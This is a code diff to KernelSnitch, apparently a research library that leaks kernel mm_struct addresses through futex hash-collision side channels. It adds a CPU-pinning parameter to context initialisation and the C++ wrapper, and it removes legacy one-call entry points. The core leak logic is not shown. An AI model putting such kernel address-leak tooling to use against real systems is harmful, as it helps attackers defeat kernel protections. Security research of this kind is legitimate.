@@ -319,13 +319,15 @@ static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_can
  * @arg __thread_cnt: thread count used for the bruteforcing phase
  * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
  * @arg __verbose: amount of print info, 1 enables and 0 disables
+ * @arg __pin_cpu: CPU the calling thread is pinned to for the search
  * @return shared KernelSnitch state
  */
 KernelSnitchContext *kernelsnitch_context_init(size_t __mm_struct_sz,
                                                size_t __mm_slab_order,
                                                size_t __thread_cnt,
                                                size_t __collision_cnt,
-                                               size_t __verbose)
+                                               size_t __verbose,
+                                               size_t __pin_cpu)
 {
     auto *ks = static_cast<KernelSnitchContext *>(SYSCHK(mmap(
         0, sizeof(KernelSnitchContext), PROT_WRITE|PROT_READ,
@@ -363,7 +365,7 @@ KernelSnitchContext *kernelsnitch_context_init(size_t __mm_struct_sz,
         ks->mm_slab_order,
         ks->thread_cnt,
         ks->collisions);
-    pin_to_core(CORE);
+    pin_to_core(__pin_cpu);
 
     ks->state = KERNELSNITCH_INIT;
     return ks;
@@ -628,30 +630,6 @@ void kernelsnitch_context_destroy(KernelSnitchContext *ks)
 }
 
 /**
- * Performs KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @arg __mm_slab_order: the order of the mm_struct slab
- * @arg __thread_cnt: thread count used for the bruteforcing phase
- * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
- * @arg __verbose: amount of print info, 1 enables and 0 disables
- * @return the found mm_struct or -1 for not found
- */
-/* Legacy all-in-one discovery entry. Inputs: explicit tuning; output: address.
- * It delegates to context init/find/scan/result/destroy without owning state. */
-size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
-{
-    KernelSnitchContext *ks = kernelsnitch_context_init(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose);
-    if (ks->verbose) pr_info("===============================================\n");
-    kernelsnitch_context_find_collisions(ks);
-    if (ks->verbose) pr_info("===============================================\n");
-    (void)kernelsnitch_context_scan(ks);
-    if (ks->verbose) pr_info("===============================================\n");
-    size_t result = kernelsnitch_context_result(ks);
-    kernelsnitch_context_destroy(ks);
-    return result;
-}
-
-/**
  * Prints the current execution state KernelSnitch is in
  * @arg ks: shared KernelSnitch state
  */
@@ -671,16 +649,6 @@ void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
         size_t addr = ks->futex_addrs[i];
         pr_info("  %016zx\n", addr);
     }
-}
-
-/**
- * KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @return: the found mm_struct address
- */
-size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
-{
-    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0);
 }
 
 #ifdef __cplusplus
@@ -718,9 +686,11 @@ class KernelSnitchOwner final {
                                                 size_t mm_slab_order,
                                                 size_t thread_cnt,
                                                 size_t collision_cnt,
-                                                size_t verbose) noexcept {
+                                                size_t verbose,
+                                                size_t pin_cpu) noexcept {
     return KernelSnitchOwner(kernelsnitch_context_init(
-        mm_struct_sz, mm_slab_order, thread_cnt, collision_cnt, verbose));
+        mm_struct_sz, mm_slab_order, thread_cnt, collision_cnt, verbose,
+        pin_cpu));
   }
 
   [[nodiscard]] KernelSnitchContext *get() const noexcept { return context_; }
